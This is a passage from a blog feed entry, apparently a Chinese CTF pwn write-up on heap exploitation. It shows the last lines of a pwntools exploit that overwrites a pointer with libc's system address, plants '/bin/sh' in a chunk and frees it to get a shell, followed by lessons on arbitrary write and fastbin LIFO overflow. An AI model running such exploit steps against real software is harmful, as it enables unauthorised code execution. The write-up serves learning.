<span class="n">sys</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">))</span>
<span class="c1">#gdb.attach(p)
</span><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="总结">总结</h3>
<hr />
<ol>
  <li>实现任意写不一定老是想着double free啥的构造双链表，只要有双指针好像都可以</li>
  <li>注意fastbin的LIFO特性，往往后分配的chunk造成的overflow可以overwrite先分配的chunk</li>
  <li>一定要记得我们的终极目标，无非是任意读和任意写，还是要靠刷题积累套路…</li>
</ol>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="pwn" /><category term="HeapExploit" /><summary type="html"><![CDATA[菜鸡的复盘]]></summary></entry></feed>